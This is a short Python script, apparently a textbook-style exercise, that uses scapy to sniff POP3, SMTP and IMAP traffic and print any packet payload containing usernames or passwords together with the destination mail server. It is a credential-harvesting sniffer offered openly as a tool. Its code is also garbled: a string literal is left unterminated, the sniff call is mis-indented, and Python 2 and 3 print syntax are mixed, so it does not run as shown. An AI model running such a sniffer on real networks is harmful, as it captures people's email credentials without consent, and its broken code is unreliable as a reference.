from scapy.all import *
import time

#packet callback
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print "[*] Server: %s" % packet[IP].dst
            print "[*] %s" % packet[TCP].payload


print('[*] Running for 100 seconds...

    
    #start sniffer
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0, timeout=100)
    #port 110 = POP3
    #port 143 = IMAP
    #port 25  = SMTP
print("[!] Scanner has finished after 100 seconds.")
exit(0)
 
